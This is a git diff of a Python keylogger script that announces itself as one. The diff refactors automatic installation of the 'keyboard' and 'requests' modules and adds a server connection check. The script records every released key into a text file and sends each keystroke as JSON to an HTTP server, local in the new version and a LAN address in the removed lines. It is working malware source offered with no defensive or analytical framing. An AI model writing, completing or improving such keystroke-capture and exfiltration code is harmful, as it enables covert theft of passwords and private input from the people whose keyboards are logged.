@@ -2,56 +2,60 @@ import subprocess
 import sys
 import os
 import requests
-print("Welcome to Keylogger, this will take your keyboard inputs in the background and put them into a text file.")
-print("Checking if the Keyboard Module Exists...")
-command = 'pip install keyboard'
-command2 = 'py ex.py'
+import importlib
 
-result = subprocess.run(command, shell=True, capture_output=True, text=True)
+def install_and_import(module_name):
+    try:
+        importlib.import_module(module_name)
+    except ImportError:
+        print(f"{module_name} not found. Installing...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
+        # Import the module after installation
+        globals()[module_name] = importlib.import_module(module_name)
 
-if "Requirement already satisfied" in result.stdout:
-    print("Keyboard Module Found")
-else:
-    print("Keyboard Module not Found\n")
-    print("Installing keyboard module...")
-    subprocess.run(command, shell=True)
-    print("Restarting the script")
-    subprocess.run(command2, shell=True)
-
-server_url = 'http://192.168.1.10:5000' 
-try:
-    response = requests.get(server_url)
-    if response.status_code == 200:
-        print("Server connected")
-    else:
-        print("Server connection failed")
-except:
-        print("Error:")
+# Check and install required modules
+install_and_import('keyboard')
+install_and_import('requests')
 
 import keyboard
+
+print("Welcome to Keylogger, this will take your keyboard inputs in the background and put them into a text file.")
+print("Checking if the Keyboard Module Exists...")
+
+server_url = 'http://127.0.0.1:5000'
+
+def check_server_connection():
+    try:
+        response = requests.get(server_url)
+        if response.status_code == 200:
+            print("Server connected")
+            return True
+        else:
+            print("Server connection failed")
+            return False
+    except Exception as e:
+        print("Error connecting to server:", e)
+        return False
+
+server_connected = check_server_connection()
 
 print("Script is running")
 
 def on_key_event(event):
-    key_pressed = str(event.name) 
-    # print(key_pressed)
-    
+    key_pressed = str(event.name)
     with open('keylogs.txt', 'a') as file:
-        file.write(key_pressed) 
-    
+        file.write(key_pressed + ' ')
+
     payload = {'key': key_pressed}
+    headers = {'Content-Type': 'application/json'}
 
-    headers = {'Content-Type': 'application/json'} 
-
-    try:
-        response = requests.post(server_url, json=payload, headers=headers) 
-        if response.status_code != 200:
-            print("Failed to send key to the server")
-    except requests.exceptions.RequestException as e:
-        print("Error:", e)
+    if server_connected:
+        try:
+            response = requests.post(server_url, json=payload, headers=headers)
+            if response.status_code != 200:
+                print("Failed to send key to the server")
+        except requests.exceptions.RequestException as e:
+            print("Error:", e)
 
 keyboard.on_release(on_key_event)
 keyboard.wait('*')
-
-python_executable = sys.executable
-os.execl(python_executable, python_executable, *sys.argv)
